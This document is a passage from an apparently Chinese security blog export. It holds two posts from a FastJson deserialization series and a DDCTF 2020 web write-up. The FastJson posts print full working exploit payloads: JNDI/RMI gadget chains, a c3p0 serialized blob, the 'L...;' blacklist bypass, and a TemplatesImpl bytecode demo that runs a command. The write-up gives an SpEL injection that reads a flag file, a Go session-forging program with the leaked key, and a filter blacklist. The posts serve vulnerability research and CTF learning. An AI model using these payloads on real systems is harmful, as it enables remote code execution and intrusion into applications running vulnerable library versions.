<p>可以看到正好满足了jndi注入的条件，现在需要考虑的是如何调用到此函数，且参数name可控。接着定位到<code>org.springframework.jndi.JndiLocatorSupport</code>类的lookup函数。</p>
<p><img src="2-2.png" alt=""></p>
<p>该类继承了JndiAccessor类，JndiAccessor类中的getJndiTemplates()函数返回的就是一个JndiTemplate对象。那么接着要找一个调用了JndiLocatorSupport类的lookup函数的类或者直接调用了JndiTemplate类的lookup函数的类。定位到<code>org.springframework.jndi.support.SimpleJndiBeanFactory</code>类。</p>
<p><img src="3-2.png" alt=""></p>
<p>该类继承自JndiLocatorSupport类，且在多个函数中调用了lookup函数。例如，<code>getBean()</code>、<code>doGetType</code>、<code>doGetSingleton</code>。虽然这里有getBean()函数，但由于它存在入口参数，所以不能在反序列化时被自动调用。那么就继续往下看，看看调用了这三个函数之一的其他函数。定位到<code>org.springframework.beans.factory.config.PropertyPathFactoryBean</code>类的<code>setBeanFactory()</code>。</p>
<p><img src="4-2.png" alt=""></p>
<p>可以看到在该函数中调用了this.beanFactory.getBean()函数，SimpleJndiBeanFactory实现了BeanFactory类，且setBeanFactory()函数满足fastjson反序列化时自动调用的条件。到此整个分析结束。</p>
<h3 id="EXP构造-2"><a href="#EXP构造-2" class="headerlink" title="EXP构造"></a>EXP构造</h3><p>上面分析了整个过程。首先待反序列化的类是<code>PropertyPathFactoryBean</code>，根据条件。</p>
<ul>
<li>1）需要给成员变量beanFactory赋值且赋值为<code>SimpleJndiBeanFactory</code>类的对象。</li>
<li>2 需要给targetBeanName赋值为jndi的url。</li>
</ul>
<p>因此，payload形式为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看setBeanFactory()函数中要走到getBean()的条件。</p>
<p><img src="5-2.png" alt=""></p>
<p>很显然，这里的targetBeanName不为null，会走到下面的判断。当propertyPath不为null的情况下，才会继续往下走。</p>
<p>因此payload增加为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;propertyPath&quot;:&quot;foo&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就调用this.beanFactory.getBean()方法。    其实在这里不是很能理解，为什么需要加上”shareableResources”的值为[“rmi://127.0.0.1:1099/EvilObject”]。这是必须条件，如果不填写这个值，反序列化beanFactory的时候就会失败，走不到this.beanFactory.getBean()。</p>
<p>之后的完整的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;propertyPath&quot;:&quot;foo&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">						 &quot;shareableResources&quot;:[&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;]</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>完整的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.24 ,spring-beans,spring-context,spring-core&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">propertypathFactorybbean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"rand1\": &#123;\"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\"targetBeanName\": \"rmi://127.0.0.1:1099/EvilObject\",\"propertyPath\": \"foo\",\"beanFactory\": &#123;\"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\": [\"rmi://127.0.0.1:1099/EvilObject\"]&#125;&#125;&#125;"</span>;</span><br><span class="line">        Object res = JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此外还有以下payload可以尝试。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: Set[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;adviceBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1:10099&#x2F;EvilObject&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">    &quot;jndiName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">    &quot;loginTimeout&quot;: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>通过查看补丁发现，原来根据”@type”的值直接加载类的操作修改为checkAutoType函数了。</p>
<p><img src="11.png" alt=""></p>
<p>且默认情况下autoType关闭了，可以看到它会经过一个黑名单判断，从而抛出异常。</p>
<p><img src="12.png" alt=""></p>
<p>其中黑名单中包括了以下大类:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bsh,</span><br><span class="line">com.mchange,</span><br><span class="line">com.sun.,</span><br><span class="line">java.lang.Thread,</span><br><span class="line">java.net.Socket,</span><br><span class="line">java.rmi,</span><br><span class="line">javax.xml,</span><br><span class="line">org.apache.bcel,</span><br><span class="line">org.apache.commons.beanutils,</span><br><span class="line">org.apache.commons.collections.Transformer,</span><br><span class="line">org.apache.commons.collections.functors,</span><br><span class="line">org.apache.commons.collections4.comparators,</span><br><span class="line">org.apache.commons.fileupload,</span><br><span class="line">org.apache.myfaces.context.servlet,</span><br><span class="line">org.apache.tomcat,</span><br><span class="line">org.apache.wicket.util,</span><br><span class="line">org.codehaus.groovy.runtime,</span><br><span class="line">org.hibernate,</span><br><span class="line">org.jboss,</span><br><span class="line">org.mozilla.javascript,</span><br><span class="line">org.python.core,</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>




<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">FastJson反序列化的前世今生</a></li>
<li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a></li>
<li><a href="https://kingx.me/Details-in-FastJson-RCE.html" target="_blank" rel="noopener">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl的利用链</a></li>
<li><a href="https://www.dazhuanlan.com/2020/02/10/5e40c9b6f1d85/" target="_blank" rel="noopener">FastJson反序列化漏洞分析</a></li>
<li><a href="https://manning23.github.io/2018/03/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jndi%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">FASTJSON反序列化之基于JNDI利用方式</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(二)</title>
    <url>/2020/05/16/fastjson-2/</url>
    <content><![CDATA[<p>前面介绍了最早的一个漏洞的利用方式。后来通过关闭默认的autotype以及增加黑名单来进行防御。本片文章分析了绕过这一防御的方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>1.2.25 &lt;= fastjson &lt;=1.2.41</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autotype<ul>
<li>JVM启动参数: -Dfastjson.parser.autoTypeSupport=True</li>
<li>代码中设置: ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</li>
</ul>
</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从1.2.25开始，增加了checkAutoType函数，加入了黑名单+白名单来防御autoType开启的情况。而此次的漏洞就是因为在autoType开启的情况下，绕过了checkAutoType。定位到checkAutoType代码(com.alibaba.fastjson.parser.ParserConfig.class)。</p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""></p>
<p>图中标注的4个框中的条件，后续的几次绕过也与它们有关，所以一起标注出来了。</p>
<ul>
<li>第一个框: 开启autoTypeSupport，通过白名单，再通过黑名单</li>
<li>第二个框: 从已经存在的map中获取clazz，若存在clazz，则直接返回</li>
<li>第三个框: 未开启autoTypeSupport，通过黑名单，再通过白名单，就加载目标类</li>
<li>第四个框: 开启autoTypeSupport，前面2步通过，就加载目标类</li>
</ul>
<p>根据上述可知，最终加载目标类有3种方式，一是不开启autoTypeSupport，二是开启autoTypeSupport，三是从map中获取clazz。</p>
<p>正常情况下TemplatesImpl类和JdbcRowSetImpl类的利用方式是无法成功的，因为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>和<code>com.sun.rowset.JdbcRowSetImpl</code>位于黑名单<code>com.sun.</code>中，如下图所示:</p>
<p><img src="3.png" alt=""></p>
<p>因此，绕过黑名单是一定需要的。因此这种情况下map中并不存在。</p>
<h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><p>此次分析的是，当autoType开启时，绕过黑名单，从而加载目标类。即通过第1，2个框，从而进入第4个框的方式。那么如何绕过呢？这就跟第4个框中的loadClass函数相关了。定位到TypeUtils.loadClass()。</p>
<p><img src="4.png" alt=""></p>
<p>可以看到它对className进行了处理之后再loadClass。  </p>
<ul>
<li>若className以<code>[</code>开头，则将其去掉。</li>
<li>若className以<code>L</code>开头，且以<code>;</code>结尾，也将这两者去掉</li>
</ul>
<p>前面黑名单的判断是用startsWith()这样的函数，这就给了攻击者可乘之机。再加上以<code>[</code>开头会实例化一个长度为0的Array，这里会出错。因此，只能利用className以<code>L</code>开头。且以<code>;</code>结尾的方式。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.41&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p><img src="5.png" alt=""></p>
<p>完整的demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.41&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><h3 id="1-将黑名单机制中的字符串改为hashcode"><a href="#1-将黑名单机制中的字符串改为hashcode" class="headerlink" title="1.将黑名单机制中的字符串改为hashcode"></a>1.将黑名单机制中的字符串改为hashcode</h3><p><img src="6.png" alt=""></p>
<h3 id="2-对checkAutoType也做了改变"><a href="#2-对checkAutoType也做了改变" class="headerlink" title="2.对checkAutoType也做了改变"></a>2.对checkAutoType也做了改变</h3><p>用于防止上述加入<code>L</code>和<code>;</code>的情况。<br><img src="7.png" alt=""></p>
<p>但是很显然，这样的改变使用2层<code>L</code>和<code>;</code>就能绕过。绕过的细节，在下一个系列进行介绍。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-DDCTF web方向 WriteUp</title>
    <url>/2020/09/08/ddctf/</url>
    <content><![CDATA[<p>上周参与了下2020 DDCTF比赛，做了web方向的题，加一个MISC的拼图，最终排名15。在这里将web方向题的writeup记录下来。</p>
<a id="more"></a>

<h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>访问地址，得到如下信息。<br><img src="1.png" alt=""><br>首先访问了第一个login的API，请求方式为POST，输入username和pwd，服务端返回了一个json数据。<br><img src="2.png" alt=""><br>其中data字段的值是jwt加密的，解密后的内容如下所示。userRole的值为GUEST，想要伪造该值为ADMIN，需要secret key，尝试爆破。利用jwtcrack工具。爆破出来的secret key与所输入的pwd的值一样，可以猜测它是使用输入的pwd作为secret key的。<br><img src="3.png" alt=""><br><img src="4.png" alt=""><br>访问第二个Auth API，带着token值，token为伪造的jwt，获取了client的下载地址，下载client。<br><img src="5.png" alt=""><br>下载client后，先file看一下文件，是个linux可执行文件，跑一下。<br><img src="6.png" alt=""><br>从这个程序中，猜测向API <a href="http://117.51.136.197/server/command" target="_blank" rel="noopener">http://117.51.136.197/server/command</a> 发送command能够返回数据。但如何发送呢，抓包查看。<br><img src="7.png" alt=""><br>发送的格式为<code>{&quot;signature&quot;:&quot;&quot;,&quot;command&quot;:&quot;&#39;DDCTF&#39;&quot;,&quot;timestamp&quot;:}</code>。<br><img src="8.png" alt=""><br>现在需要知道的是，如何对发送的command生成正确的签名。这时候需要逆向一下client。在getSign函数中发现了一些信息，通过这些信息猜测了一下它应该是<code>HMAC</code>算法，使用的hash函数为<code>sha256</code>，加密密钥为<code>DDCTFWithYou</code>。 所需要加密的数据为”command|timestamp”。<br><img src="9.png" alt=""><br>结果证明猜测正确。<br><img src="10.png" alt=""><br>在输入id等命令无果后，后端应该不是shell，然后想到了模版注入，经测试，最后锁定为spel注入。模版注入的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&quot;cat &#x2F;home&#x2F;dc2-user&#x2F;flag&#x2F;flag.txt&quot;).getInputStream())</span><br></pre></td></tr></table></figure>
<p>最后成功获取flag。<br><img src="11.png" alt=""></p>
<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>卡片商店题目打开内容如下:<br><img src="12.png" alt=""><br>点击重新开始后，在活动结束前共有3分钟的时间。意味着需要在3分钟内获得100张卡片，每借出一次卡片，在30s后可多获得3张，每借入一张卡片，需多还2张。经测试可以输入0张卡片，但即使这样，最多也只能获得99张卡片。对伪造session没有想法时，继续回想，既然最少可输入0，那么最多可输入多少呢？会存在溢出吗？使用2^62次数据，溢出了。<br><img src="13.png" alt=""><br>在借卡记录归还后，兑换礼物，获得下面的提示。<br><img src="14.png" alt=""><br>看到这个secret key就想到了应该是要伪造session，一般常见的是伪造flask的session，但这个的session明显不一样。首先来看一下session。<br><img src="15.png" alt=""><br>将-以及_替换为/和+后，进行解密后有如下一串结果，最后有个admin是bool值，可能为false，需要伪造为True。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DstringwalletstringUS&#123;&quot;owings&quot;:[],&quot;invests&quot;:[],&quot;money&quot;:12,&quot;now_time&quot;:1599226651,&quot;start_time&quot;:1599226471&#125;stringadminbool</span><br></pre></td></tr></table></figure>

<p>在尝试了多个框架的session后，最后发现为Go语言的echo框架。在网上找了echo框架的session生成。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"github.com/labstack/echo/v4"</span></span><br><span class="line">	<span class="string">"github.com/gorilla/sessions"</span></span><br><span class="line">	<span class="string">"github.com/labstack/echo-contrib/session"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	e := echo.New()</span><br><span class="line">	e.Use(session.Middleware(sessions.NewCookieStore([]<span class="keyword">byte</span>(<span class="string">"Udc13VD5adM_c10nPxFu@v12"</span>))))</span><br><span class="line"></span><br><span class="line">	e.Get(<span class="string">"/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c echo.Context)</span> <span class="title">error</span></span>&#123;</span><br><span class="line">		sess, _ := session.Get(<span class="string">"session"</span>,c)</span><br><span class="line">		sess.Options = &amp;sessions.Options&#123;</span><br><span class="line">			Path: <span class="string">"/"</span>,</span><br><span class="line">			MaxAge: <span class="number">86400</span>*<span class="number">7</span>,</span><br><span class="line">			HttpOnly: <span class="literal">true</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		sess.Values[<span class="string">"admin"</span>] = <span class="literal">true</span></span><br><span class="line">		sess.Save(c.Request(), c.Response())</span><br><span class="line">		<span class="keyword">return</span> c.NoContent(http.StatusOK)</span><br><span class="line">	&#125;)</span><br><span class="line">	</span><br><span class="line">	e.Logger.Fatal(e.Start(<span class="string">":1323"</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后访问1323端口，替换掉原来的session，访问/flag，即可获得flag。<br><img src="16.png" alt=""></p>
<h2 id="EASY-WEB"><a href="#EASY-WEB" class="headerlink" title="EASY_WEB"></a>EASY_WEB</h2><p>easy_web这道题打开是一个登录框，抓包后，响应中有deleteme，确认后端有shiro，想到了shiro之前爆出来的xx/..;/绕过鉴权的漏洞。<br><img src="17.png" alt=""><br>查看源码后，发现有一个下载图片的接口，然后尝试任意文件下载漏洞，经测试，只能下载到web目录中的文件，而无法越到其他目录。<br><img src="18.png" alt=""><br>在这里尝试读取源码。首先通过WEB-INF/web.xml发现了com.ctf.util.SafeFilter和spring-web.xml，下载下来。com.ctf.util.SafeFilter里面是一个黑名单，对传入的参数会进行黑名单的检测，若存在黑名单，则返回403。黑名单如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;java.+lang&quot;</span><br><span class="line">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;</span><br><span class="line">&quot;exec.*\\(&quot;</span><br><span class="line">&quot;write|read&quot;</span><br><span class="line">&quot;invoke.*\\(&quot;</span><br><span class="line">&quot;\\.forName.*\\(&quot;</span><br><span class="line">&quot;lookup.*\\(&quot;</span><br><span class="line">&quot;\\.getMethod.*\\(&quot;</span><br><span class="line">&quot;javax.+script.+ScriptEngineManager&quot;</span><br><span class="line">&quot;com.+fasterxml&quot;</span><br><span class="line">&quot;org.+apache&quot;</span><br><span class="line">&quot;org.+hibernate&quot;</span><br><span class="line">&quot;org.+thymeleaf&quot;</span><br><span class="line">&quot;javassist&quot;</span><br><span class="line">&quot;javax\\.&quot;</span><br><span class="line">&quot;eval.*\\(&quot;</span><br><span class="line">&quot;\\.getClass\\(&quot;</span><br><span class="line">&quot;org.+springframework&quot;</span><br><span class="line">&quot;javax.+el&quot;</span><br><span class="line">&quot;java.+io&quot;</span><br></pre></td></tr></table></figure>

